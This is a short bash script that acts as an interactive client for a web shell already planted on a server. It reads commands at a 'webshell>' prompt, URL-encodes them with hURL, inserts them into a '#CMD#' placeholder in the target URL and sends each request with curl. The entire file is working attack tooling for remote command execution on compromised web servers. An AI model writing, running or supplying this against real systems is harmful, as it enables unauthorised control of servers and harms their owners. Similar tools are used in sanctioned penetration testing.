#!/bin/bash

REPLACE='#CMD#'

if [[ -z $(which hURL) ]]; then 
    echo "requires hurl"; 
    exit;
fi

if [[ $# -ne 1 ]]; then
    echo "Usage: $0 'http://example.com?cmd=$REPLACE'";
    exit;
fi

URL=$1

echo "URL: $URL"

while true; do
    read -p 'webshell> '
    encoded=$(echo $REPLY | hURL -U --file /dev/stdin -s --nocolor)
    request=$(echo $URL | sed "s/$REPLACE/$encoded/")
    curl $request
done
